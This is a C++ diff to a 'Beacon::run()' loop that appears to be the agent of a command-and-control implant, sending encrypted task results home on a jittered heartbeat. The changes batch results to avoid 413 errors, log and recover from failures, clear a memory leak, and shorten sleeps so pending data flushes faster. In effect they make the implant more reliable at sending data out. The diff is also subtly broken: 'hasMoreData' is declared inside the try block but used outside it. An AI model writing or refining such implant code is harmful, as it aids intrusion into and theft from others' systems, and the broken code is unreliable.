@@ -123,10 +123,12 @@ void Beacon::run() {
             };
             LOG_DEBUG("Sending beacon heart-beat...");
 
-            // Move pending results to in-flight
+            // Move limited subset of results to in-flight to avoid 413
+            int cappedCount = 0;
             Result result;
-            while (pendingResults_.try_dequeue(result)) {
+            while (cappedCount < 10 && pendingResults_.try_dequeue(result)) {
                 inFlightResults_.push_back(result);
+                cappedCount++;
             }
 
             for (const auto& res : inFlightResults_) {
@@ -138,6 +140,9 @@ void Beacon::run() {
             }
 
             std::string payload_str = payload.dump();
+            
+            // If we have more data, we'll skip sleep later
+            bool hasMoreData = !pendingResults_.empty();
             std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());
 
             std::vector<BYTE> nonce(12);
@@ -209,11 +214,22 @@ void Beacon::run() {
                 }
             }
 
-        } catch (const std::exception&) {
-            // Silently continue
+        } catch (const std::exception& e) {
+            LOG_ERR("Beacon failed: " + std::string(e.what()));
+            // Clear in-flight results if they are likely causing 413/failure
+            // This prevents the 2GB memory leak
+            if (inFlightResults_.size() > 5) {
+                LOG_WARN("Clearing in-flight results to recover from potential 413/network error");
+                inFlightResults_.clear();
+            }
         }
 
-        sleepWithJitter();
+        // If data is pending, flush it faster instead of full sleep
+        if (hasMoreData) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        } else {
+            sleepWithJitter();
+        }
     }
 }
 
